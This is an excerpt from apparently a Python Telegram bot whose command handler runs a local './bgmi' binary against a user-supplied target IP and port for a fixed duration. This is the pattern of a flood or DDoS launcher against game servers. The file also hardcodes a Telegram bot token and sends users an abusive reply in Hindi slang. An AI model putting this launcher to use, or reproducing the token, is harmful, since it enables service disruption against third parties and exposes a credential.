...
async def bgmi_command(message, bot):
    try:
        ...
        command = f'./bgmi {target_ip} {target_port} {default_duration} 165'
...
TOKEN = '7690966712:AAEAQ1ZE3iKB9MRW0pbO8JGdKw2lDB0l1Jg'
...
def handle_start_help(message):
    bot.reply_to(message, ' | [ DON\'T BE OVERSMART @TG_FLASH92 BAP HAI TUMHARA BKL ] |')
